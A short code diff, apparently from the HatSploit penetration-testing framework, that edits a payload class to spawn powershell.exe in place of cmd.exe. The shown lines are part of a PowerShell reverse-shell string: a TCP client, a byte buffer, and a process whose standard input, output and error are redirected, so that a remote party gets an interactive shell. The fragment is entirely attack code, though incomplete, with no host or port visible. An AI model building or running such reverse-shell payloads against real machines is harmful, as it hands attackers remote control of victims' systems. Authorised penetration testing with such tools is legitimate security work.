@@ -55,7 +55,7 @@ class HatSploitPayload(Payload, TCPClient):
             "$eb=New-Object System.Byte[] 65536;"
             "$e=new-object System.Text.UTF8Encoding;"
             "$p=New-Object System.Diagnostics.Process;"
-            "$p.StartInfo.FileName='cmd.exe';"
+            "$p.StartInfo.FileName='powershell.exe';"
             "$p.StartInfo.RedirectStandardInput=1;"
             "$p.StartInfo.RedirectStandardOutput=1;"
             "$p.StartInfo.RedirectStandardError=1;"
